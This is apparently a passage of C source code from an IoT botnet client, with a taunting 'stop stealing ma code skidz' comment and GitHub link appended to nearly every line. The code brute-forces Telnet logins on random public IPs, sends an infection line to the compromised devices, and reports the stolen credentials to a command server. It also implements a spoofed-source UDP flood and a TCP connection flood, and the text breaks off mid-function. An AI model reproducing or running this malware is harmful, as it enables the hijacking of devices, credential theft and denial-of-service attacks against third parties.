dest_addr.sin_family = AF_INET; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
dest_addr.sin_port = htons(23); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owostruct telstate_t // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int fd; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint32_t ip; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint8_t state; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint8_t complete; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint8_t usernameInd; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint8_t passwordInd; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint32_t totalTimeout; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
uint16_t bufUsed; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
char *sockbuf; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} fds[max]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(fds, 0, max * (sizeof(int) + 1)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for(i = 0; i < max; i++) { fds[i].complete = 1; fds[i].sockbuf = malloc(1024); memset(fds[i].sockbuf, 0, 1024); } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct timeval timeout; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
timeout.tv_sec = 5; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
timeout.tv_usec = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for(i = 0; i < max; i++) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
switch(fds[i].state) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
case 0: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(fds[i].sockbuf, 0, 1024); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(fds[i].complete) { char *tmp = fds[i].sockbuf; memset(&(fds[i]), 0, sizeof(struct telstate_t)); fds[i].sockbuf = tmp; fds[i].ip = getRandomPublicIP(); } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].passwordInd++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(fds[i].passwordInd == sizeof(passwords) / sizeof(char *)) { fds[i].passwordInd = 0; fds[i].usernameInd++; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(fds[i].usernameInd == sizeof(usernames) / sizeof(char *)) { fds[i].complete = 1; continue; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
dest_addr.sin_family = AF_INET; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
dest_addr.sin_port = htons(23); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
dest_addr.sin_addr.s_addr = fds[i].ip; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].fd = socket(AF_INET, SOCK_STREAM, 0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
setsockopt (fds[i].fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
setsockopt (fds[i].fd, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(fds[i].fd == -1) { continue; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) { /*printf("close %lu\n",fds[i].ip);*/ sclose(fds[i].fd); fds[i].complete = 1; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else { fds[i].state = 1; fds[i].totalTimeout = 0; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owocase 1: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoFD_ZERO(&myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
FD_SET(fds[i].fd, &myset); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_sec = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
tv.tv_usec = 10000; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
res = select(fds[i].fd+1, NULL, &myset, NULL, &tv); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(res == 1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
lon = sizeof(int); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
valopt = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(valopt) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sclose(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].complete = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].totalTimeout = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].bufUsed = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(fds[i].sockbuf, 0, 1024); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 2; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else if(res == -1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sclose(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].complete = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(fds[i].totalTimeout + 5 < time(NULL)) //was if(fds[i].totalTimeout + 5 < time(NULL)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sclose(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].complete = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owocase 2: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(matchPrompt(fds[i].sockbuf)) { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 7; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(readUntil(fds[i].fd, "ogin:", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].totalTimeout = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].bufUsed = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(fds[i].sockbuf, 0, 1024); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 3; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].bufUsed = strlen(fds[i].sockbuf); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(fds[i].totalTimeout + 30 < time(NULL)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sclose(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].complete = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owocase 3: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 4; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owocase 4: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(readUntil(fds[i].fd, "assword:", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].totalTimeout = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].bufUsed = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(strstr(fds[i].sockbuf, "assword:") != NULL) fds[i].state = 5; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else fds[i].state = 7; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(fds[i].sockbuf, 0, 1024); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(strstr(fds[i].sockbuf, "ncorrect") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].bufUsed = strlen(fds[i].sockbuf); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(fds[i].totalTimeout + 8 < time(NULL)) //was if(fds[i].totalTimeout + 8 < time(NULL)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sclose(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].complete = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owocase 5: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 6; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owocase 6: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(readUntil(fds[i].fd, "ncorrect", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].totalTimeout = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].bufUsed = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(strstr(fds[i].sockbuf, "ncorrect") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(!matchPrompt(fds[i].sockbuf)) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else fds[i].state = 7; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(fds[i].sockbuf, 0, 1024); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].bufUsed = strlen(fds[i].sockbuf); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(fds[i].totalTimeout + 30 < time(NULL)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sclose(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].complete = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owocase 7: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 8; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owocase 8: // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(send(fds[i].fd, infectline, strlen(infectline), MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(fds[i].totalTimeout + 8 < time(NULL)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sclose(fds[i].fd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].state = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fds[i].complete = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owovoid sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct sockaddr_in dest_addr; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owodest_addr.sin_family = AF_INET; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(port == 0) dest_addr.sin_port = rand_cmwc(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else dest_addr.sin_port = htons(port); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(getHost(target, &dest_addr.sin_addr)) return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-oworegister unsigned int pollRegister; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pollRegister = pollinterval; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(spoofit == 32) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(!sockfd) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockprintf(mainCommSock, "Failed opening raw socket."); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *buf = (unsigned char *)malloc(packetsize + 1); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(buf == NULL) return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(buf, 0, packetsize + 1); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
makeRandomStr(buf, packetsize); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint end = time(NULL) + timeEnd; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register unsigned int i = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(i == pollRegister) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(port == 0) dest_addr.sin_port = rand_cmwc(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(time(NULL) > end) break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
i = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
i++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} else { // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(!sockfd) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockprintf(mainCommSock, "Failed opening raw socket."); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
//sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint tmp = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockprintf(mainCommSock, "Failed setting raw headers mode."); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
return; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint counter = 50; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(counter--) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
srand(time(NULL) ^ rand_cmwc()); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
init_rand(rand()); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoin_addr_t netmask; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) ); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
else netmask = ( ~((1 << (32 - spoofit)) - 1) ); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct iphdr *iph = (struct iphdr *)packet; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct udphdr *udph = (void *)iph + sizeof(struct iphdr); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owomakeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoudph->len = htons(sizeof(struct udphdr) + packetsize); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
udph->source = rand_cmwc(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
udph->dest = (port == 0 ? rand_cmwc() : htons(port)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
udph->check = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owomakeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoiph->check = csum ((unsigned short *) packet, iph->tot_len); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoint end = time(NULL) + timeEnd; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
register unsigned int i = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoudph->source = rand_cmwc(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
udph->dest = (port == 0 ? rand_cmwc() : htons(port)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->id = rand_cmwc(); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->saddr = htonl( getRandomIP(netmask) ); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
iph->check = csum ((unsigned short *) packet, iph->tot_len); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(i == pollRegister) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(time(NULL) > end) break; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
i = 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
i++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owo//CNC Botnet Flood // stop stealing ma code skidz -> https://github.com/riu-developer-owo
void sendCNC(unsigned char *ip,int port, int end_time) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int end = time(NULL) + end_time; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int sockfd; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
struct sockaddr_in server; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
//sockfd = socket(AF_INET, SOCK_STREAM, 0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoserver.sin_addr.s_addr = inet_addr(ip); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
server.sin_family = AF_INET; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
server.sin_port = htons(port); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owowhile(end > time(NULL)) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sockfd = socket(AF_INET, SOCK_STREAM, 0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
connect(sockfd , (struct sockaddr *)&server , sizeof(server)); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sleep(1); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
close(sockfd); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
